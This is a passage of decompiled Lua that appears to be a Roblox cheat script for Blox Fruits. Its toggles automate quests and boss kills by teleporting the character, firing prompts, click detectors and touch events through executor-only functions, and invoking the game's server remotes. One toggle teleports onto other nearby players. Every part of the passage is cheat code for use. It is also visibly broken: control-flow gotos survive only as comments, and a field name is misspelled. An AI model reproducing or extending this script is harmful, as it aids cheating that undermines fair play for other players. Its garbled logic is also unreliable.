            if Ex == 2 then
                repeat
                    wait()
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Map.HeavenlyDimension.Exit.CFrame
                until not _G.CDK_TS or tonumber(replicated.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Good) == 3
            end
			-- goto l90
			-- ::l102::
            wait()
            _tp(CFrame.new(- 22529.6171875, 5275.7739257812, 3873.5712890625))
            local v586, v587, v588 = pairs(workspace.Map.HeavenlyDimension:GetDescendants())
            while true do
                local v589
                v588, v589 = v586(v587, v588)
                if v588 == nil then
                    break
                end
                if v589:IsA("ProximityPrompt") then
                    fireproximityprompt(v589)
                end
            end
            if (CFrame.new(- 22529.6171875, 5275.7739257812, 3873.5712890625).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >= 5 then
				-- goto l102
            end
            wait(2)
            _G.DoneT1 = true
            if _G.CDK_TS and not _G.DoneT1 then
				-- ::l90::
                wait()
				-- goto l102
            end
			-- goto l105
			-- ::l115::
            wait()
            _tp(CFrame.new(- 22637.291015625, 5281.365234375, 3749.2885742188))
            local v590, v591, v592 = pairs(workspace.Map.HeavenlyDimension:GetDescendants())
            while true do
                local v593
                v592, v593 = v590(v591, v592)
                if v592 == nil then
                    break
                end
                if v593:IsA("ProximityPrompt") then
                    fireproximityprompt(v593)
                end
            end
            if (CFrame.new(- 22637.291015625, 5281.365234375, 3749.2885742188).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >= 5 then
				-- goto l115
            end
            wait(2)
            _G.DoneT2 = true
            if not _G.DoneT2 and _G.CDK_TS ~= false then
				-- ::l105::
                wait()
				-- goto l115
            end
			-- goto l118
			-- ::l128::
            task.wait()
            _tp(CFrame.new(- 22791.14453125, 5277.1655273438, 3764.5700683594))
            local v594, v595, v596 = pairs(workspace.Map.HeavenlyDimension:GetDescendants())
            while true do
                local v597
                v596, v597 = v594(v595, v596)
                if v596 == nil then
                    break
                end
                if v597:IsA("ProximityPrompt") then
                    fireproximityprompt(v597)
                end
            end
            if (CFrame.new(- 22791.14453125, 5277.1655273438, 3764.5700683594).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >= 5 then
				-- goto l128
            end
            wait(2)
            _G.DoneT3 = true
            if _G.DoneT3 or _G.CDK_TS == false then
                local v598, v599, v600 = pairs(workspace.Enemies:GetChildren())
                while true do
                    local v601
                    v600, v601 = v598(v599, v600)
                    if v600 == nil then
                        break
                    end
                    if (v601:FindFirstChild("HumanoidRootPart").Position - CFrame.new(- 22695.7012, 5270.93652, 3814.42847, 0.11794927, 3.32185834e-8, 0.99301964, - 8.73070718e-8, 1, - 2.30819008e-8, - 0.99301964, - 8.3975138e-8, 0.11794927).Position).Magnitude <= 300 and (v601:FindFirstChild("HumanoidRootPart") and (v601:FindFirstChild("Humanoid") and v601:FindFirstChild("Humanoid").Health > 0)) then
                        repeat
                            wait()
                            vu28.Kill(v601, _G.CDK_TS)
                        until not _G.CDK_TS or (v601.Humanoid.Health <= 0 or not v601.Parent)
                    end
                end
				-- goto l3
            end
			-- ::l118::
            wait()
			-- goto l128
        end)
    end
end)
v226.Quests:AddSection("True Triple Katana Sword")
v226.Quests:AddButton({
    ["Title"] = "Buy Legendary Sword",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("LegendarySwordDealer", "1")
        replicated.Remotes.CommF_:InvokeServer("LegendarySwordDealer", "2")
        replicated.Remotes.CommF_:InvokeServer("LegendarySwordDealer", "3")
    end
})
v226.Quests:AddButton({
    ["Title"] = "Buy True Triple Katana Sword",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("MysteriousMan", "2")
    end
})
v226.Quests:AddToggle("Q", {
    ["Title"] = "Tween to Legendary Sword Dealer",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p602)
    _G.Tp_LgS = p602
end)
spawn(function()
    while wait(Sec) do
        if _G.Tp_LgS then
            pcall(function()
                local v603, v604, v605 = pairs(replicated.NPCs:GetChildren())
                while true do
                    local v606
                    v605, v606 = v603(v604, v605)
                    if v605 == nil then
                        break
                    end
                    if v606.Name == "Legendary Sword Dealer " then
                        _tp(v606.HumanoidRootPart.CFrame)
                    end
                end
            end)
        end
    end
end)
v226.Quests:AddSection("Pole / God Enal\'s")
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Pole V1",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p607)
    _G.AutoPole = p607
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        if _G.AutoPole then
            pcall(function()
				-- upvalues: (ref) vu28
                local v608 = GetConnectionEnemies("Thunder God")
                if v608 then
                    task.wait()
                    vu28.Kill(v608, _G.AutoPole)
                    if not _G.AutoPole or (not v608.Parent or v608.Humanoid.Health <= 0) then
						-- goto l6
                    end
                end
                _tp(CFrame.new(- 7994.984375, 5761.025390625, - 2088.6479492188))
				-- ::l6::
            end)
        end
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Pole V2 [Beta]",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p609)
    _G.AutoPoleV2 = p609
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.AutoPoleV2 then
                if not GetBP("Pole (1st Form)") then
                    replicated.Remotes.CommF_:InvokeServer("LoadItem", "Pole (1st Form)")
                end
                if not GetBP("Pole (2nd Form)") then
                    replicated.Remotes.CommF_:InvokeServer("LoadItem", "Pole (2nd Form)")
                end
                if GetBP("Pole (1st Form)") and GetBP("Pole (1st Form)").Level.Value <= 179 then
                    _G.Level = true
                elseif GetBP("Pole (1st Form)") and GetBP("Pole (1st Form)").Level.Value >= 180 then
                    _G.Level = false
                end
                if not GetBP("Rumble Fruit") then
                    return
                end
                if GetBP("Rumble Fruit").AwakenedMoves:FindFirstChild("Z") and (GetBP("Rumble Fruit").AwakenedMoves:FindFirstChild("X") and (GetBP("Rumble Fruit").AwakenedMoves:FindFirstChild("C") and (GetBP("Rumble Fruit").AwakenedMoves:FindFirstChild("V") and GetBP("Rumble Fruit").AwakenedMoves:FindFirstChild("F")))) then
                    _G.SelectChip = nil
                    _G.Raiding = false
                    _G.Auto_Awakener = false
                    if plr.Data.Fragments.Value >= 5000 then
                        replicated.Remotes.CommF_:InvokeServer("Thunder God", "Talk")
                        wait(Sec)
                        replicated.Remotes.CommF_:InvokeServer("Thunder God", "Sure")
                    end
                elseif replicated.Remotes.CommF_:InvokeServer("Awakener", "Check") == nil or replicated.Remotes.CommF_:InvokeServer("Awakener", "Check") == 0 then
                    _G.SelectChip = "Rumble"
                    local v610 = replicated.Remotes.CommF_:InvokeServer("RaidsNpc", "Select", _G.SelectChip)
                    if v610 then
                        v610:Stop()
                    end
                    _G.Raiding = true
                    _G.Auto_Awakener = true
                end
            end
        end)
    end
end)
v226.Quests:AddSection("Items Law/Order Sword")
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Law Sword",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p611)
    _G.AutoLawKak = p611
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        if _G.AutoLawKak then
            pcall(function()
				-- upvalues: (ref) vu28
                local v612 = GetConnectionEnemies("Order")
                if v612 then
                    task.wait()
                    vu28.Kill(v612, _G.AutoLawKak)
                    if _G.AutoLawKak == false or (not v612.Parent or v612.Humanoid.Health <= 0) then
						-- goto l6
                    end
                end
                _tp(CFrame.new(- 6217.2021484375, 28.047645568848, - 5053.1357421875))
				-- ::l6::
            end)
        end
    end
end)
v226.Quests:AddButton({
    ["Title"] = "Buy Microchip Law",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BlackbeardReward", "Microchip", "2")
    end
})
v226.Quests:AddButton({
    ["Title"] = "Start Law Raids",
    ["Description"] = "",
    ["Callback"] = function()
        fireclickdetector(workspace.Map.CircleIsland.RaidSummon.Button.Main.ClickDetector)
    end
})
v226.Quests:AddSection("East Blue Misc")
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Saw Sword",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p613)
    _G.AutoSaw = p613
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(0.2) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.AutoSaw then
                local v614 = GetConnectionEnemies("The Saw")
                if v614 then
                    task.wait()
                    vu28.Kill(v614, _G.AutoSaw)
                    if _G.AutoSaw == false or v614.Humanoid.Health <= 0 then
						-- goto l3
                    end
                end
                _tp(CFrame.new(- 784.89715576172, 72.427383422852, 1603.5822753906))
            end
			-- ::l3::
        end)
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Saber Sword",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p615)
    _G.AutoSaber = p615
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(0.2) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.AutoSaber and plr.Data.Level.Value >= 200 and not (plr.Backpack:FindFirstChild("Saber") or plr.Character:FindFirstChild("Saber")) then
                if workspace.Map.Jungle.Final.Part.Transparency ~= 0 then
                    if workspace.Enemies:FindFirstChild("Saber Expert") or replicated:FindFirstChild("Saber Expert") then
                        local v616, v617, v618 = pairs(workspace.Enemies:GetChildren())
                        while true do
                            local v619
                            v618, v619 = v616(v617, v618)
                            if v618 == nil then
                                break
                            end
                            if v619.Name == "Saber Expert" and vu28.Alive(v619) then
                                repeat
                                    task.wait()
                                    vu28.Kill(v619, _G.AutoSaber)
                                until v619.Humanoid.Health <= 0 or _G.AutoSaber == false
                                if v619.Humanoid.Health <= 0 then
                                    replicated.Remotes.CommF_:InvokeServer("ProQuestProgress", "PlaceRelic")
                                end
                            end
                        end
                    else
                        _tp(CFrame.new(- 1401.85046, 29.9773273, 8.81916237, 0.85820812, 8.76083845e-8, 0.513301849, - 8.55007443e-8, 1, - 2.77243419e-8, - 0.513301849, - 2.00944328e-8, 0.85820812))
                    end
                elseif workspace.Map.Jungle.QuestPlates.Door.Transparency ~= 0 then
                    if workspace.Map.Desert.Burn.Part.Transparency ~= 0 then
                        if replicated.Remotes.CommF_:InvokeServer("ProQuestProgress", "SickMan") == 0 then
                            if replicated.Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") ~= nil then
                                if replicated.Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") ~= 0 then
                                    if replicated.Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") == 1 then
                                        replicated.Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon")
                                        EquipWeapon("Relic")
                                        _tp(CFrame.new(- 1404.91504, 29.9773273, 3.80598116, 0.876514494, 5.66906877e-9, 0.481375456, 2.53851997e-8, 1, - 5.79995607e-8, - 0.481375456, 6.30572643e-8, 0.876514494))
                                    end
                                elseif workspace.Enemies:FindFirstChild("Mob Leader") or replicated:FindFirstChild("Mob Leader") then
                                    _tp(CFrame.new(- 2967.59521, - 4.91089821, 5328.70703, 0.342208564, - 0.0227849055, 0.939347804, 0.0251603816, 0.999569714, 0.0150796166, - 0.939287126, 0.0184739735, 0.342634559))
                                    local v620, v621, v622 = pairs(workspace.Enemies:GetChildren())
                                    while true do
                                        local v623
                                        v622, v623 = v620(v621, v622)
                                        if v622 == nil then
                                            break
                                        end
                                        if v623.Name == "Mob Leader" and vu28.Alive(v623) then
                                            repeat
                                                task.wait()
                                                vu28.Kill(v623, _G.AutoSaber)
                                            until v623.Humanoid.Health <= 0 or _G.AutoSaber == false
                                        end
                                    end
                                end
                            else
                                replicated.Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon")
                            end
                        else
                            replicated.Remotes.CommF_:InvokeServer("ProQuestProgress", "GetCup")
                            wait(0.5)
                            EquipWeapon("Cup")
                            wait(0.5)
                            replicated.Remotes.CommF_:InvokeServer("ProQuestProgress", "FillCup", plr.Character.Cup)
                            wait(Sec)
                            replicated.Remotes.CommF_:InvokeServer("ProQuestProgress", "SickMan")
                        end
                    elseif plr.Backpack:FindFirstChild("Torch") or plr.Character:FindFirstChild("Torch") then
                        EquipWeapon("Torch")
                        firetouchinterest(plr.Character.Torch.Handle, workspace.Map.Desert.Burn.Fire, 0)
                        firetouchinterest(plr.Character.Torch.Handle, workspace.Map.Desert.Burn.Fire, 1)
                        _tp(CFrame.new(1114.61475, 5.04679728, 4350.22803, - 0.648466587, - 1.28799094e-9, 0.761243105, - 5.70652914e-10, 1, 1.20584542e-9, - 0.761243105, 3.47544882e-10, - 0.648466587))
                    else
                        _tp(CFrame.new(- 1610.00757, 11.5049858, 164.001587, 0.984807551, - 0.167722285, - 0.0449818149, 0.17364943, 0.951244235, 0.254912198, 0.0000342372805, - 0.258850515, 0.965917408))
                    end
                elseif (CFrame.new(- 1612.55884, 36.9774132, 148.719543, 0.37091279, 3.0717151e-9, - 0.928667724, 3.97099491e-8, 1, 1.91679348e-8, 0.928667724, - 4.39869794e-8, 0.37091279).Position - plr.Character.HumanoidRootPart.Position).Magnitude > 100 then
                    _tp(CFrame.new(- 1612.55884, 36.9774132, 148.719543, 0.37091279, 3.0717151e-9, - 0.928667724, 3.97099491e-8, 1, 1.91679348e-8, 0.928667724, - 4.39869794e-8, 0.37091279))
                else
                    _tp(plr.Character.HumanoidRootPart.CFrame)
                    wait(0.5)
                    plr.Character.HumanoidRootPart.CFrame = workspace.Map.Jungle.QuestPlates.Plate1.Button.CFrame
                    wait(0.5)
                    plr.Character.HumanoidRootPart.CFrame = workspace.Map.Jungle.QuestPlates.Plate2.Button.CFrame
                    wait(0.5)
                    plr.Character.HumanoidRootPart.CFrame = workspace.Map.Jungle.QuestPlates.Plate3.Button.CFrame
                    wait(0.5)
                    plr.Character.HumanoidRootPart.CFrame = workspace.Map.Jungle.QuestPlates.Plate4.Button.CFrame
                    wait(0.5)
                    plr.Character.HumanoidRootPart.CFrame = workspace.Map.Jungle.QuestPlates.Plate5.Button.CFrame
                    wait(0.5)
                end
            end
        end)
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Cybrog",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p624)
    _G.AutoColShad = p624
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(0.2) do
        if _G.AutoColShad then
            pcall(function()
				-- upvalues: (ref) vu28
                local v625 = GetConnectionEnemies("Cyborg")
                if v625 then
                    repeat
                        task.wait()
                        vu28.Kill(v625, _G.AutoColShad)
                    until _G.AutoColShad == false or (not v625.Parent or v625.Humanoid.Health <= 0)
                else
                    _tp(CFrame.new(6094.0249023438, 73.770050048828, 3825.7348632813))
                end
            end)
        end
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Usoap\'s Hat",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p626)
    _G.AutoGetUsoap = p626
end)
spawn(function()
    while task.wait(Sec) do
        pcall(function()
            if _G.AutoGetUsoap then
                local v627, v628, v629 = pairs(workspace.Characters:GetChildren())
                while true do
                    local v630
                    v629, v630 = v627(v628, v629)
                    if v629 == nil then
                        break
                    end
                    if v630.Name ~= plr.Name and (v630.Humanoid.Health > 0 and (v630:FindFirstChild("HumanoidRootPart") and (v630.Parent and (Root.Position - v630.HumanoidRootPart.Position).Magnitude <= 230))) then
                        repeat
                            task.wait()
                            EquipWeapon(_G.SelectWeapon)
                            _tp(v630.HumanoidRootPart.CFrame * CFrame.new(1, 1, 2))
                        until _G.AutoGetUsoap == false or (v630.Humanoid.Health <= 0 or not (v630.Parent and (v630:FindFirstChild("HumanoidRootPart") and v630:FindFirstChild("Humanoid"))))
                    end
                end
            end
        end)
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Bisento V2",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p631)
    _G.Greybeard = p631
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        if _G.Greybeard then
            pcall(function()
				-- upvalues: (ref) vu28
                if GetWP("Bisento") then
                    if GetWP("Bisento") then
                        replicated.Remotes.CommF_:InvokeServer("LoadItem", "Bisento")
                        local v632 = GetConnectionEnemies("Greybeard")
                        if v632 then
                            repeat
                                wait()
                                vu28.Kill(v632, _G.Greybeard)
                            until _G.Greybeard == false or (not v632.Parent or v632.Humanoid.Health <= 0)
                        else
                            _tp(CFrame.new(- 5023.3833007812, 28.652032852173, 4332.3818359375))
                        end
                    end
                else
                    replicated.Remotes.CommF_:InvokeServer("BuyItem", "Bisento")
                end
            end)
        end
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Warden Sword",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p633)
    _G.WardenBoss = p633
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(0.1) do
        if _G.WardenBoss then
            pcall(function()
				-- upvalues: (ref) vu28
                local v634 = GetConnectionEnemies("Chief Warden")
                if v634 then
                    repeat
                        wait()
                        vu28.Kill(v634, _G.WardenBoss)
                    until _G.WardenBoss == false or (not v634.Parent or v634.Humanoid.Health <= 0)
                else
                    _tp(CFrame.new(5206.92578, 0.997753382, 814.976746, 0.342041343, - 0.00062915677, 0.939684749, 0.00191645394, 0.999998152, - 0.0000280422337, - 0.939682961, 0.00181045406, 0.342041939))
                end
            end)
        end
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Marine Coat",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p635)
    _G.MarinesCoat = p635
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(0.1) do
        if _G.MarinesCoat then
            pcall(function()
				-- upvalues: (ref) vu28
                local v636 = GetConnectionEnemies("Vice Admiral")
                if v636 then
                    repeat
                        wait()
                        vu28.Kill(v636, _G.MarinesCoat)
                    until _G.MarinesCoat == false or (not v636.Parent or v636.Humanoid.Health <= 0)
                else
                    _tp(CFrame.new(- 5006.5454101563, 88.032081604004, 4353.162109375))
                end
            end)
        end
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Swan Coat",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p637)
    _G.SwanCoat = p637
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(0.1) do
        if _G.SwanCoat then
            pcall(function()
				-- upvalues: (ref) vu28
                local v638 = GetConnectionEnemies("Swan")
                if v638 then
                    wait()
                    vu28.Kill(v638, _G.SwanCoat)
                    if _G.SwanCoat == false or (not v638.Parent or v638.Humanoid.Health <= 0) then
						-- goto l6
                    end
                end
                _tp(CFrame.new(5325.09619, 7.03906584, 719.570679, - 0.309060812, 0, 0.951042235, 0, 1, 0, - 0.951042235, 0, - 0.309060812))
				-- ::l6::
            end)
        end
    end
end)
v226.Quests:AddSection("Rengoku Sword")
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Rengoku Sword",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p639)
    _G.IceBossRen = p639
end)
spawn(function()
	-- upvalues: (ref) vu28
    pcall(function()
		-- upvalues: (ref) vu28
        while true do
            if not wait(0.1) then
                return
            end
            if _G.IceBossRen then
                local v640 = GetConnectionEnemies("Awakened Ice Admiral")
                if v640 then
                    task.wait()
                    vu28.Kill(v640, _G.IceBossRen)
                    if _G.IceBossRen ~= false and (v640.Parent and v640.Humanoid.Health > 0) then
						-- goto l8
                    end
                else
					-- ::l8::
                    _tp(CFrame.new(5668.9780273438, 28.519989013672, - 6483.3520507813))
                end
            end
        end
    end)
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Key Rengoku",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p641)
    _G.KeysRen = p641
end)
spawn(function()
	-- upvalues: (ref) vu11, (ref) vu28
    while wait(0.1) do
        pcall(function()
			-- upvalues: (ref) vu11, (ref) vu28
            if _G.KeysRen then
                if plr.Backpack:FindFirstChild(vu11[3]) or plr.Character:FindFirstChild(vu11[3]) then
                    EquipWeapon(vu11[3])
                    wait(0.1)
                    _tp(CFrame.new(6571.1201171875, 299.23028564453, - 6967.841796875))
                else
                    local v642 = GetConnectionEnemies(vu11)
                    if v642 then
                        repeat
                            task.wait()
                            vu28.Kill(v642, _G.KeysRen)
                        until plr.Backpack:FindFirstChild(vu11[3]) or (_G.KeysRen == false or (not v642.Parent or v642.Humanoid.Health <= 0))
                    else
                        _tp(CFrame.new(5439.716796875, 84.420944213867, - 6715.1635742188))
                    end
                end
            end
        end)
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Dragon Trident",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p643)
    _G.AutoTridentW2 = p643
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(0.1) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.AutoTridentW2 then
                local v644 = GetConnectionEnemies("Tide Keeper")
                if v644 then
                    repeat
                        task.wait()
                        vu28.Kill(v644, _G.AutoTridentW2)
                    until _G.AutoTridentW2 == false or (not v644.Parent or v644.Humanoid.Health <= 0)
                else
                    _tp(CFrame.new(- 3795.6423339844, 105.88877105713, - 11421.307617188))
                end
            end
        end)
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Long Sword",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p645)
    _G.LongsWord = p645
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(0.1) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.LongsWord then
                local v646 = GetConnectionEnemies("Diamond")
                if v646 then
                    repeat
                        task.wait()
                        vu28.Kill(v646, _G.LongsWord)
                    until _G.LongsWord == false or (not v646.Parent or v646.Humanoid.Health <= 0)
                else
                    _tp(CFrame.new(- 1576.7166748047, 198.59265136719, 13.724286079407))
                end
            end
        end)
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Black Spikey",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p647)
    _G.BlackSpikey = p647
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(0.1) do
        if _G.BlackSpikey then
            pcall(function()
				-- upvalues: (ref) vu28
                local v648 = GetConnectionEnemies("Jeremy")
                if v648 then
                    repeat
                        wait()
                        vu28.Kill(v648, _G.BlackSpikey)
                    until _G.BlackSpikey == false or (not v648.Parent or v648.Humanoid.Health <= 0)
                else
                    _tp(CFrame.new(2006.9261474609, 448.95666503906, 853.98284912109))
                end
            end)
        end
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Dark Blade V3",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p649)
    _G.DarkBladev3 = p649
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.DarkBladev3 and World2 then
                if not GetBP("Dark Blade") then
                    replicated.Remotes.CommF_:InvokeServer("LoadItem", "Dark Blade")
                end
                if GetBP("Fist of Darkness") <= 1 then
                    _G.AutoFarmChest = true
                elseif workspace.Enemies:FindFirstChild("Darkbeard") then
                    if GetConnectionEnemies("Darkbeard") and GetBP("Fist of Darkness") >= 1 then
                        repeat
                            wait()
                            _tp(CFrame.new(- 5719.3637695312, 48.505905151367, - 782.97595214844))
                        until not _G.DarkBladev3 or Root.Position == CFrame.new(- 5719.3637695312, 48.505905151367, - 782.97595214844).Position
                        fireclickdetector(workspace.Map.GraveIsland.Mountain.Rocks.Button.ClickDetector)
                    end
                else
                    _tp(CFrame.new(3677.08203125, 62.751937866211, - 3144.8332519531))
                end
            end
        end)
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Midnight Blade",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p650)
    _G.AutoEcBoss = p650
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.AutoEcBoss then
                if GetM("Ectoplasm") < 99 then
                    if GetM("Ectoplasm") <= 99 then
                        local v651 = GetConnectionEnemies("Cursed Captain")
                        if v651 then
                            repeat
                                wait()
                                vu28.Kill(v651, _G.AutoEcBoss)
                            until not _G.AutoEcBoss or (not v651.Parent or v651.Humanoid.Health <= 0)
                        else
                            replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                            wait(0.5)
                            _tp(CFrame.new(916.928589, 181.092773, 33422))
                        end
                    end
                else
                    replicated.Remotes.CommF_:InvokeServer("Ectoplasm", "Buy", 3)
                end
            end
        end)
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Darkbeard",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p652)
    _G.Auto_Def_DarkCoat = p652
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(0.1) do
        if _G.Auto_Def_DarkCoat then
            pcall(function()
				-- upvalues: (ref) vu28
                if GetBP("Fist of Darkness") and not workspace.Enemies:FindFirstChild("Darkbeard") then
                    _tp(CFrame.new(3677.08203125, 62.751937866211, - 3144.8332519531))
                elseif GetConnectionEnemies("Darkbeard") then
                    local v653 = GetConnectionEnemies("Darkbeard")
                    if v653 then
                        repeat
                            wait()
                            vu28.Kill(v653, _G.Auto_Def_DarkCoat)
                        until _G.Auto_Def_DarkCoat == false or (not v653.Parent or v653.Humanoid.Helath <= 0)
                    end
                elseif not (GetBP("Fist of Darkness") or GetConnectionEnemies("Darkbeard")) then
                    repeat
                        wait(0.1)
                        _G.AutoFarmChest = true
                    until not _G.Auto_Def_DarkCoat or (GetBP("Fist of Darkness") or GetConnectionEnemies("Darkbeard"))
                    _G.AutoFarmChest = false
                end
            end)
        end
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Unlocked DonSwan",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p654)
    _G.Auto_DonAcces = p654
end)
spawn(function()
    while wait(0.1) do
        if _G.Auto_DonAcces then
            pcall(function()
                if replicated.Remotes.CommF_:InvokeServer("GetUnlockables").FlamingoAccess == nil and plr.Data.Level.Value >= 1500 then
                    FruitPrice = {}
                    FruitStore = {}
                    local v655 = next
                    local v656, v657 = replicated:WaitForChild("Remotes").CommF_:InvokeServer("GetFruits")
                    while true do
                        local v658
                        v657, v658 = v655(v656, v657)
                        if v657 == nil then
                            break
                        end
                        if v658.Price >= 1000000 then
                            table.insert(FruitPrice, v658.Name)
                        end
                    end
                    local v659, v660, v661 = pairs(replicated.Remotes.CommF_:InvokeServer("getInventoryFruits"))
                    while true do
                        local v662
                        v661, v662 = v659(v660, v661)
                        if v661 == nil then
                            break
                        end
                        local v663, v664, v665 = pairs(v662)
                        while true do
                            local v666
                            v665, v666 = v663(v664, v665)
                            if v665 == nil then
                                break
                            end
                            if v665 == "Name" then
                                table.insert(FruitStore, v666)
                            end
                        end
                        replicated.Remotes.CommF_:InvokeServer("Cousin", "Buy")
                        local v667, v668, v669 = pairs(FruitPrice)
                        while true do
                            local v670
                            v669, v670 = v667(v668, v669)
                            if v669 == nil then
                                break
                            end
                            local v671, v672, v673 = pairs(FruitStore)
                            while true do
                                local v674
                                v673, v674 = v671(v672, v673)
                                if v673 == nil then
                                    break
                                end
                                if v670 == v674 and replicated.Remotes.CommF_:InvokeServer("GetUnlockables").FlamingoAccess == nil then
                                    _G.StoreF = false
                                    if plr.Backpack:FindFirstChild(FruitStore) then
                                        replicated.Remotes.CommF_:InvokeServer("TalkTrevor", "1")
                                        replicated.Remotes.CommF_:InvokeServer("TalkTrevor", "2")
                                        replicated.Remotes.CommF_:InvokeServer("TalkTrevor", "3")
                                    else
                                        replicated.Remotes.CommF_:InvokeServer("LoadFruit", tostring(v670))
                                    end
                                end
                            end
                        end
                        if replicated.Remotes.CommF_:InvokeServer("GetUnlockables").FlamingoAccess ~= nil then
                            _G.StoreF = true
                            _G.Auto_DonAcces = false
                        end
                    end
                end
            end)
        end
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Swan Glasses",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p675)
    _G.Auto_SwanGG = p675
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(0.2) do
        if _G.Auto_SwanGG then
            pcall(function()
				-- upvalues: (ref) vu28
                local v676 = GetConnectionEnemies("Don Swan")
                if v676 then
                    repeat
                        wait()
                        vu28.Kill(v676, _G.Auto_SwanGG)
                    until _G.Auto_SwanGG == false or (not v676.Parent or v676.Humanoid.Health <= 0)
                else
                    _tp(CFrame.new(2286.2004394531, 15.177839279175, 863.8388671875))
                end
            end)
        end
    end
end)
v226.Quests:AddSection("Cavender + Twin Hooks + Bigmom")
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Bigmom",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p677)
    _G.AutoBigmom = p677
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        if _G.AutoBigmom then
            pcall(function()
				-- upvalues: (ref) vu28
                local v678 = GetConnectionEnemies("Cake Queen")
                if v678 then
                    task.wait()
                    vu28.Kill(v678, _G.AutoBigmom)
                    if not _G.AutoBigmom or (not v678.Parent or v678.Humanoid.Health <= 0) then
						-- goto l6
                    end
                end
                _tp(CFrame.new(- 709.31329345703, 381.6005859375, - 11011.396484375))
				-- ::l6::
            end)
        end
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Canvendish Sword",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p679)
    _G.Auto_Cavender = p679
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.Auto_Cavender then
